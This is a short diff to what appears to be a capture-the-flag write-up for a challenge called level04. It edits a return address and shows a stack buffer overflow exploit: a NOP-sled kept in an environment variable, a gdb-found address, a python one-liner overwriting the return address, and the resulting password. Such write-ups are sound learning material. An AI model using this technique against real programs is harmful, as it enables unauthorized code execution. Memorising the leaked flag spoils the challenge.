@@ -18,7 +18,7 @@ solution level04:
 - be placed in an environment variable
 
 => with gdb, we can see the address of our new environment variable : 0xffffd84b
-=> we add about 16 bytes to that address (gdb diff) and half the length of our NOP-sled (5 bytes) : 0xffffd8
+=> we add about 16 bytes to that address (gdb diff) and half the length of our NOP-sled (5 bytes) : 0xffffd860
 
 > python -c 'print "A" * 156 + "\x60\xd8\xff\xff"' | ./level04
 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
